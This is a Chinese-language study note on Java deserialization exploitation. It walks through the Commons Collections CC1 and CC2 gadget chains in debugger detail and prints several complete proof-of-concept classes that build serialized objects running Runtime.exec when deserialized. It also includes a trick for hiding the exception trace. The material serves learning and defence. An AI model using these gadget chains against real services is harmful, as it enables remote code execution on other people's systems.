java中的`transient` 关键字，是短暂的意思。对于`transient` 修饰的成员变量，在序列化处理过程中会被忽略。

Java安全漫谈-08反序列化篇2

https://www.cnblogs.com/CoLo/p/15211200.html

 https://blog.csdn.net/Saintyyu/article/details/104228506

# CommonsCollections1链

**JDK 8U71 前**

导入 pom 依赖

```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```

P神给出的 demo

```
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CC1Demo1 {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outerMap.put("test","xxx");
    }
}
```

![image-20220115112212186](img/image-20220115112212186.png)![image-20220115112212186](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115112212186.png?lastModify=1646033842)

这里涉及到了几个接口和类。

## Transformer

是 Commons-Collections 组件提供的一个接口

![image-20220115115454949](img/image-20220115115454949.png)![image-20220115115454949](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115115454949.png?lastModify=1646033842)

## ConstantTransformer

看其构造函数，作用是返回参数传入的对象。

![image-20220115112414126](img/image-20220115112414126.png)![image-20220115112414126](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115112414126.png?lastModify=1646033842)

## InvokerTransformer

构造函数也是进行赋值，具体作用稍后再说

![image-20220115112459935](img/image-20220115112459935.png)![image-20220115112459935](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115112459935.png?lastModify=1646033842)

## ChainedTransformer

也是仅进行赋值

![image-20220115112702098](img/image-20220115112702098.png)![image-20220115112702098](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115112702098.png?lastModify=1646033842)

还可以发现上述类都继承了两接口

```
implements Transformer, Serializable
```

并且重写了 `transform` 方法。（关键）

Serializable 保证能够序列化和反序列化

## TransformedMap

也为 `commons.collections` 的一个类

```
public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable 
```

最终是 `implements Map`

其`decorate` 方法返回一个参数没变对象类型变为`TransformedMap` 的对象，

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

作用就是修饰Map。 

## 分析

demo中最后调用了一个 put 方法，也就是`TransformedMap` 的`put` 方法，

参数为`chainedTransformer` ,下断点调试

强制步入

![image-20220115113527430](img/image-20220115113527430.png)![image-20220115113527430](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115113527430.png?lastModify=1646033842)

跟进 `transformKey(key);` 看一波

![image-20220115113608918](img/image-20220115113608918.png)![image-20220115113608918](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115113608918.png?lastModify=1646033842)

这里由于 keyTransformer 为 null ，所以直接返回被修饰过的 Mapzhongde key ，也就是传入的 “test”

keyTransformer  的值其实是在这里传入的，传入为 null ，但是 valueTransformer 就不为 null 了

```
 Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
```

![image-20220115113656135](img/image-20220115113656135.png)![image-20220115113656135](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115113656135.png?lastModify=1646033842)

跟进`transformValue(value)` ，这里调用到了 `chainedTransformer`的 `transform` 方法，也就是上边说过的 重写的方法。

![image-20220115113851608](img/image-20220115113851608.png)![image-20220115113851608](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115113851608.png?lastModify=1646033842)

跟进，这里调用其参数中的每个`transform` 方法，

参数为

```
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.getRuntime()),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};
```

![image-20220115113957728](img/image-20220115113957728.png)![image-20220115113957728](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115113957728.png?lastModify=1646033842)

继续跟进，此时 `iTransformers[i]` 为  `ConstantTransformer` ,

根其参数无关，返回 `iConstant` ，而`iConstant` 就是之前构造函数赋值的`Runtime.getRuntime()` 也即是 `Runtime` 对象。 

![image-20220115114148473](img/image-20220115114148473.png)![image-20220115114148473](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115114148473.png?lastModify=1646033842)

第二次调用：

第一次返回的`object` 作为第二次的参数：

跟进,即为`InvokerTransformer` 的 transform 方法

![image-20220115114432814](img/image-20220115114432814.png)![image-20220115114432814](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115114432814.png?lastModify=1646033842)

这里利用反射，得到之前传入的`exec` 方法，并调用它，成功执行命令

![image-20220115114612964](img/image-20220115114612964.png)![image-20220115114612964](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115114612964.png?lastModify=1646033842)

此时在回顾一下其中用到的各个类的 `transform` 方法的作用。

- ConstantTransformer  返回构造函数传入的对象
- InvokerTransformer  反射执行任意方法，也是反序列化能够执行任意代码的关键
- ChainedTransformer  将多个 Transformer 串在一起，前一个返回的结果，作为后一个的参数

demo也就好理解了，执行`Runtime`的`exec` 方法。

利用修饰过后的Map来触发一系列`transform` 方法。

但是这里我们使用手动调用其`put`方法触发的漏洞，实际应用中，需要反序列化自动触发。

## AnnotationInvocationHandler

反序列化的触发点是`readObject` ,所以需要在 readObject 中触发上方的poc。

有个类 `sun.reflect.annotation.AnnotationInvocationHandler` ，看它的`readObject`方法，

![image-20220115125320235](img/image-20220115125320235.png)![image-20220115125320235](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115125320235.png?lastModify=1646033842)

这里`this.memberValues.entrySet().iterator()` 为迭代每一对键值对，`setValue` 为关键调用，

> memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这⾥遍历了它的所有元素，并依次设置值。在调⽤setValue设置值的时候就会触发TransformedMap⾥注册的Transform，进⽽执⾏我们为其精⼼设计的任意代码。

![image-20220115125709570](img/image-20220115125709570.png)![image-20220115125709570](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115125709570.png?lastModify=1646033842)

创建`AnnotationInvocationHandler` 对象，但是这里构造函数为包访问权限，所以需要反射实例化。

![image-20220115125758995](img/image-20220115125758995.png)![image-20220115125758995](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115125758995.png?lastModify=1646033842)

这里构造函数的参数为

```
Class<? extends Annotation> var1, Map<String, Object> var2
```

参数一需为注解类的扩展类对象

参数二需为Map对象

参数二好说，是poc中的修饰过后的Map对象，但是参数一不太确定？

而且构造函数中必须满足 if 条件才可以赋值，判断条件都是基于参数一的

```
if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class)
```

贴一下师傅们的解释 https://xz.aliyun.com/t/7031#toc-9

```
nnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    Class[] var3 = var1.getInterfaces();
    if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时
        this.type = var1;//传入的var1到this.type
        this.memberValues = var2;//我们的map传入this.memberValues
    } else {
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    }
}



private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        //默认反序列化
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();//
        Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();//遍历map迭代器
            String var6 = (String)var5.getKey();//获取key的名称
            Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样
            if (var7 != null) {
                Object var8 = var5.getValue();//获取map的value
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
}
```

那么实例化`constructor.newInstance` 的参数一应该是啥？

Java 提供了4个标准的用来对注解类型进行注解的注解类，我们称之为 meta-annotation（元注解），他们分别是：`@Target` , `@Retention` , `@Documented` , `@Inherited` ，(可以表注其他注解的注解)

@interface用来声明一个注解，其会自动继承java.lang.annotation.Annotation接口

```
【格式：】
public @interface 注解名 {定义体}
【或者：】
public @interface 注解名 {
  类型 value() default 默认值;   //这里是参数，不是抽象方法。
}

其中定义体实质是声明了一个配置参数（注：此处不是抽象方法）。
1、方法名指的是参数名。
2、返回值类型指的是参数的类型（只能为基本类型、Class、String、enum、Annotation类型、以及以上所有类型的数组）。
3、可以通过default来声明参数的默认值。
4、如果只有一个参数，那么参数名（方法名）一般为value。
5、只能使用public, default两个权限修饰符。
```

如果参数一是 `Override.class`，可以成功实例化，

```
Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
Object obj = constructor.newInstance(Override.class, outerMap);
System.out.println(obj);

ByteOutputStream byteOutputStream = new ByteOutputStream();
ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);
objectOutputStream.writeObject(obj);

System.out.println(byteOutputStream);
ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteOutputStream.getBytes()));
objectInputStream.readObject();
```

爆出异常：

```
Exception in thread "main" java.io.NotSerializableException: java.lang.Runtime
```

意思为： `java.lang.Runtime` 不能序列化。

**待序列化的对象和它使用的内部属性对象，都必须实现`java.io.Serializable`接口**，但是demo中`new ConstantTransformer(Runtime.getRuntime())` ，`Runtime` 是没有实现序列化接口的，那么我们可以使用反射来获取它

```
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};
```

但是，可以序列化，但是反序列化时却没有执行命令。

在 AnnotationInvocationHandler的 `readObject` 方法下断点调试：

发现这里 if 判断没进去

![image-20220115141225444](img/image-20220115141225444.png)![image-20220115141225444](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115141225444.png?lastModify=1646033842)

var7 与 var3 ，var6 有关，var3 与 var2 有关，var2 与 this.type 有关，

意思为 var7 为 var3中  键为 var6 对应的值。而此时 var6 也为空，

所以说 Map需要传入一对键值对，恰巧其中的键 也要在 var7 Map中。

那么只需研究 var7 是怎么来的即可。

```
var2 = AnnotationType.getInstance(this.type);
// this.type 为构造函数传入的参数一
// getInstance会获取到注解的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。

Map var3 = var2.memberTypes();
// 获取注解元素的键值对  {value：ElementType的键值对}

Class var7 = (Class)var3.get(var6);
public Map<String, Class<?>> memberTypes() {
    return this.memberTypes;
}
```

所以，我们只需找到注解，并且其有元素的注解即可。

```
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.SOURCE)
public @interface Override {
}
```

override 注解没有元素属性，所以更换。

```
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Target {
    ElementType[] value();
}

// 这里其实是 @Target(value=ElementType.ANNOTATION_TYPE)
```

使用`Target.class` ，只需向 Map中添加一个 键为`value` 的键值对即可。

可以看到此时已经获取到 value 对应的值。

![image-20220115142859068](img/image-20220115142859068.png)![image-20220115142859068](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115142859068.png?lastModify=1646033842)

随后进入

![image-20220115143126871](img/image-20220115143126871.png)![image-20220115143126871](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115143126871.png?lastModify=1646033842)

成功调用 `transform` 方法，执行命令

![image-20220115143215548](img/image-20220115143215548.png)![image-20220115143215548](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115143215548.png?lastModify=1646033842)

同样的，这里 Retention 注解也是可以的

```
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Retention {
    RetentionPolicy value();
}
```

## POC

```
package cc1;

import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import com.sun.xml.internal.ws.util.HandlerAnnotationInfo;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1Demo1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);


        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);
        System.out.println(obj);

        ByteOutputStream byteOutputStream = new ByteOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);
        objectOutputStream.writeObject(obj);

        System.out.println(byteOutputStream);
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteOutputStream.getBytes()));
        objectInputStream.readObject();

    }
}
```

## 高版本问题

此POC在 JDK8u71 版本后，就会发现无发成功执行命令。

因为在 8U71 版本后，`sun.reflect.annotation.AnnotationInvocationHandler` 的 `readObject` 函数被修改了，

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    GetField var2 = var1.readFields();
    Class var3 = (Class)var2.get("type", (Object)null);
    Map var4 = (Map)var2.get("memberValues", (Object)null);
    AnnotationType var5 = null;

    try {
        var5 = AnnotationType.getInstance(var3);
    } catch (IllegalArgumentException var13) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var6 = var5.memberTypes();
    LinkedHashMap var7 = new LinkedHashMap();

    String var10;
    Object var11;
    for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
        Entry var9 = (Entry)var8.next();
        var10 = (String)var9.getKey();
        var11 = null;
        Class var12 = (Class)var6.get(var10);
        if (var12 != null) {
            var11 = var9.getValue();
            if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
            }
        }
    }

    AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
}
```

P神：

> 对于这次修改，有些⽂章说是因为没有了setValue，其实原因和setValue关系不⼤。改动后，不再直接使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。
>
> 所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执⾏set或put操作，也就不会触发RCE了

## ysoserial

```
/*
   Gadget chain:
      ObjectInputStream.readObject()
         AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
               AnnotationInvocationHandler.invoke()
                  LazyMap.get()
                     ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Class.getMethod()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Runtime.getRuntime()
                        InvokerTransformer.transform()
                           Method.invoke()
                              Runtime.exec()

   Requires:
      commons-collections
 */
```

## LazyMap

ysoserial中使用的是`LazyMap`，

```
LazyMap` 和 `TransformedMap` 都是`commons collections`提供的类，且都继承于`AbstractInputCheckedMapDecorator
```

LazyMap `decorate` 方法也会返回一个装饰后的Map

![image-20220115151707052](img/image-20220115151707052.png)![image-20220115151707052](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115151707052.png?lastModify=1646033842)

两个类不同的是 `TransformedMap` 是`put` 调用`transform` 方法，

而`LazyMap` 是 `get` 调用 `transform`，

![image-20220115151753953](img/image-20220115151753953.png)![image-20220115151753953](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115151753953.png?lastModify=1646033842)

当`map.containsKey(key)` 不存在时，会调用 `factory.transform` 方法。

demo：

```
package cc1;

import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1Demo2 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");

        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        outerMap.get("x");


    }
}
```

可以弹出计算器。

和前面类似，这是手动调用的 `get` 方法，我们需要自动让其被调用。在`AnnotationInvocationHandler` 中的`readObject` 中并没有调用到`LazzyMap` 的 `get` 方法。

ysoserial中利用了 `AnnotationInvocationHandler` 的 `invoke` 方法，

```
this.memberValues.get(var4)
```

![image-20220115152752444](img/image-20220115152752444.png)![image-20220115152752444](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115152752444.png?lastModify=1646033842)

但是又如何使得 `invoke` 方法被调用呢？

## Java动态代理

使用Java动态代理。

`开发`中使用动态代理的主要目的是`在不改变目标对象方法的情况下对方法进行增强`。

```
public static Object newProxyInstance(ClassLoader loader,Class<?>[] interfaces,InvocationHandler h)
```

参数一： ClassLoader

参数二：需要代理的对象集合

参数三：一个实现了`InvocationHandler`接口的类，包含了具体的处理逻辑

看`AnnotationInvocationHandler` 类其实就相当于上面的参数三。

我们如果将这个对象用Proxy代理，那么在 readObject的时候，只要调用任意方法，都会进入到`invoke`方法中，进而触发`LazyMap#get`。

## POC

```
package cc1;

import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Demo2 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");

        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
//        outerMap.get("x");

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);

        handler  = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(handler);
        System.out.println(byteArrayOutputStream);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();
    }
}
```

代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹：

```
handler  = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
```

## ysoserial的操作

上述poc控制台会报异常，产生一定的特征

```
java.lang.ProcessImpl cannot be cast to java.util.Set
```

![image-20220115160201763](img/image-20220115160201763.png)![image-20220115160201763](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115160201763.png?lastModify=1646033842)

ysoserial中`Transformer` 数组中新增了一个

```
new ConstantTransformer(1)
```

异常信息会变成，隐藏了启动进程的日志特征

![image-20220115163253670](img/image-20220115163253670.png)![image-20220115163253670](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115163253670.png?lastModify=1646033842)

此POC仍只能在 jdk 8u71 版本之前使用。



Java安全漫谈 - 09.反序列化篇(3).pdf

Java安全漫谈 - 09.反序列化篇(4).pdf

Java安全漫谈 - 09.反序列化篇(5).pdf

https://xz.aliyun.com/t/7031

https://blog.csdn.net/pengjunlee/article/details/79683621

https://www.cnblogs.com/l-y-h/p/11111539.html

https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/

[https://www.cnblogs.com/nice0e3/p/13798371.html#0x00-%E5%89%8D%E8%A8%80](https://www.cnblogs.com/nice0e3/p/13798371.html#0x00-前言)

# CommonsCollections2链

针对的是`commons collections4` .

与之前的 `commons-collections:commons-collections` 3.1  是两个不同的分支。二者可共存。

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

首先看看CC1 的链还能不能再 4.0 版本中使用，

将包名`org.apache.commons.collections` 改为 `org.apache.commons.collections4` 。

发现

![image-20220115183847596](img/image-20220115183847596.png)![image-20220115183847596](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115183847596.png?lastModify=1646033842)

但其实，4.0版本`LazyMap` 中有个方法可以替代之前的`decorate`

![image-20220115184026420](img/image-20220115184026420.png)![image-20220115184026420](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115184026420.png?lastModify=1646033842)

修改，成功弹calc

![image-20220115184146551](img/image-20220115184146551.png)![image-20220115184146551](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115184146551.png?lastModify=1646033842)

> commons-collections这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其中包含了⼀些可以执⾏任意⽅法的**Transformer**。所以，**在commons-collections**中找Gadget的过程，实际上可以简化为，找⼀条从erializable#readObject()⽅法到 **Transformer#transform()**
>
> **⽅法的调⽤链**。

## PriorityQueue

> **PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 " 队尾进 , 队头出 " 的特点 , 但队列中每次插入或删除元素时 , 都会根据比较器( Comparator )对队列进行调整 .**

`java.util.PriorityQueue` :

重写了`readObject` 方法，

![image-20220115184601921](img/image-20220115184601921.png)![image-20220115184601921](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115184601921.png?lastModify=1646033842)

## TransformingComparator

```
org.apache.commons.collections4.comparators.TransformingComparator
```

`compare` 方法中有调用到`transform()` 方法。

![image-20220115185628624](img/image-20220115185628624.png)![image-20220115185628624](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115185628624.png?lastModify=1646033842)

所以，CC2链实际就是一条从`PriorityQueue` 到 `TransformingComparator` 的利用链。

```
PriorityQueue#heapify --->
PriorityQueue#siftDown --->
PriorityQueue#siftDownUsingComparator --->
comparator.compare ------  TransformingComparator --->
this.transformer 
```

## POC1

```
package cc2;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformer = {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        TransformingComparator comparator = new TransformingComparator(chainedTransformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(chainedTransformer, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

调试,跟进`PriorityQueue#readObject` ，

![image-20220115202046144](img/image-20220115202046144.png)![image-20220115202046144](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115202046144.png?lastModify=1646033842)

`queue[i]` 为add 进去的对象，跟进 `heapify`方法：

![image-20220115202240723](img/image-20220115202240723.png)![image-20220115202240723](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115202240723.png?lastModify=1646033842)

这里`i=(size >>> 1) -1`将size进行了右移操作，所以`size>=2`才能进入判断。跟进`siftDown` 方法,comparator 是 poc 传入的 `comparator` 即`new TransformingComparator(chainedTransformer)`

```
new PriorityQueue(2, comparator)
```

![image-20220115202424817](img/image-20220115202424817.png)![image-20220115202424817](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115202424817.png?lastModify=1646033842)

跟进`siftDownUsingComparator` 方法,

![image-20220115202705194](img/image-20220115202705194.png)![image-20220115202705194](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115202705194.png?lastModify=1646033842)

跟进`comparator.compare(x, (E) c)` ,这里的 `comparator` 为poc传入的`TransformingComparator`对象

![image-20220115203040000](img/image-20220115203040000.png)![image-20220115203040000](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115203040000.png?lastModify=1646033842)

这里的`this.transformer` 即为当初传入的`chainedTransformer`

调用了`this.transforme` 被调用了两次，所以会弹出两个计算器。

之后的流程就和CC1那里的差不多了。



## javassist

静态编程： 类型检查是在编译时完成的

动态编程：类型检查是在运行时完成的

> Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。 Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。

感觉跟加强版的反射差不多。

#### 使用

几个比较重要的类：

